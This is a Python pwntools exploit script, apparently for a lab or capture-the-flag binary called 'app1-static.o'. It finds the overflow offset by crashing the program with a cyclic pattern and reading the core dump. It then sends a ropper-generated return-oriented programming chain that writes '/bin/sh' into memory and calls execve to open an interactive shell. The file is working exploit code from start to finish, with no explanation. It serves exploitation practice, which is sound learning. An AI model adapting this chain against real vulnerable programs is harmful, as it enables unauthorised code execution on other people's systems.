#!/usr/bin/env python3
# Generated by ropper ropchain generator #
from struct import pack
from pwn import *
import sys

if len(sys.argv)==1:
    app_path = "./app1-static.o"
else:
    app_path=sys.argv[1]

pty = process.PTY
elf = ELF(app_path)
io = process(elf.path, stdin=pty, stdout=pty)
io.clean()
io.sendline(cyclic(100, n=4))
io.wait()
core = io.corefile
eip_offset = cyclic_find(pack(core.eip))
info("eip offset = %d", eip_offset)

IMAGE_BASE_0 = 0x08048000 # ea88f091f052bb24e5dbbe0e939ac377c5d5671d8ccc9c20c40ed91d3fc980c3
rebase_0 = lambda x : p32(x + IMAGE_BASE_0)

rop = b'a'*(eip_offset)

rop += rebase_0(0x00001743) # 0x08049743: pop edi; ret; 
rop += b'/bin'
rop += rebase_0(0x0000101e) # 0x0804901e: pop ebx; ret; 
rop += rebase_0(0x0009e060)
rop += rebase_0(0x000475fd) # 0x0808f5fd: mov dword ptr [ebx], edi; pop ebx; pop esi; pop edi; ret; 
rop += p32(0xdeadbeef)
rop += p32(0xdeadbeef)
rop += p32(0xdeadbeef)
rop += rebase_0(0x00001743) # 0x08049743: pop edi; ret; 
rop += b'/sh\x00'
rop += rebase_0(0x0000101e) # 0x0804901e: pop ebx; ret; 
rop += rebase_0(0x0009e064)
rop += rebase_0(0x000475fd) # 0x0808f5fd: mov dword ptr [ebx], edi; pop ebx; pop esi; pop edi; ret; 
rop += p32(0xdeadbeef)
rop += p32(0xdeadbeef)
rop += p32(0xdeadbeef)
rop += rebase_0(0x00001743) # 0x08049743: pop edi; ret; 
rop += p32(0x00000000)
rop += rebase_0(0x0000101e) # 0x0804901e: pop ebx; ret; 
rop += rebase_0(0x0009e068)
rop += rebase_0(0x000475fd) # 0x0808f5fd: mov dword ptr [ebx], edi; pop ebx; pop esi; pop edi; ret; 
rop += p32(0xdeadbeef)
rop += p32(0xdeadbeef)
rop += p32(0xdeadbeef)
rop += rebase_0(0x0000101e) # 0x0804901e: pop ebx; ret; 
rop += rebase_0(0x0009e060)
rop += rebase_0(0x0001bd11) # 0x08063d11: pop ecx; add al, 0xf6; ret; 
rop += rebase_0(0x0009e068)
rop += rebase_0(0x00050d45) # 0x08098d45: pop edx; xor eax, eax; pop edi; ret; 
rop += rebase_0(0x0009e068)
rop += p32(0xdeadbeef)
rop += rebase_0(0x00001825) # 0x08049825: pop ebp; ret; 
rop += p32(0x0000000b)
rop += rebase_0(0x0001bb9b) # 0x08063b9b: xchg eax, ebp; ret; 
rop += rebase_0(0x00032170) # 0x0807a170: int 0x80; ret;

p = process(elf.path)
gdb.attach(p)
p.readuntil("Please enter your name: \n")
p.sendline(rop)
p.interactive()
p.close()
